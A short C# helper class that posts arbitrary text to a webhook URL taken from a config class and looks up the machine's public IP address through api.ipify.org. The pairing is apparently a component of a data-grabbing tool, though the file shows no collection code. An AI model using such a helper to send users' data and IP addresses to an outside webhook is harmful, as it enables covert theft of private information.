using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;


class web
{
    public static WebClient client = new WebClient();
    public static void upload_text(string ctx)
    {
        NameValueCollection nameValueCollection = new NameValueCollection();

        nameValueCollection.Add("content", ctx);

        client.UploadValues(config.webhook_url, nameValueCollection);
    }

    public static string get_ip()
    {
        return client.DownloadString("https://api.ipify.org");
    }
}

